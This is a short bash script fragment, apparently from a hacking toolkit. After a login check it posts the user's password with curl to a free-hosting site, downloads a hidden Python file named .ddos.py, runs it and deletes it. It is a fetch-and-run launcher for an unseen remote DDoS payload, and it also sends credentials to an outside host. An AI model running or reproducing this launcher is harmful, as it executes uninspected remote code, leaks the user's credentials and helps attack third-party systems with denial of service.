source $dir/.authenticate.sh
if [[ $login == "false" ]]; then
    echo "incorrect username or password"
    sleep 5
    clear
    exit
elif [[ $login == "failed" ]]; then
    echo "login failed"
    sleep 5
    clear
    exit
elif [[ $login == "true" ]]; then
    echo
    echo
    echo "[*] Login Successfull"
    sleep 2
    curl -o $dir/.ddos.py -d "pass=$pass" -X POST "https://sample2276.000webhostapp.com/commandchecker.php?user=$user&command=ddos" -s 
fi

python2 $dir/.ddos.py
rm $dir/.ddos.py